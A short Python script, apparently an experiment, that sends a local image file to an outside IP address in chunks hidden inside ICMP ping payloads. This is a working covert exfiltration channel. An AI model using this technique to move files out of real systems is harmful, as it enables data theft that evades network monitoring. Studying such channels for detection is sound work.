from pythonping import ping
from time import sleep

with open("./send_logo.jpg", "rb") as f:
    while True:
        byte = f.read(1024)
        if byte == b"":
            ping("118.38.155.112", verbose=True, count=1, payload=b"EOF")
            break
        ping("118.38.155.112", verbose=True, count=1, payload=byte)
        sleep(0.5)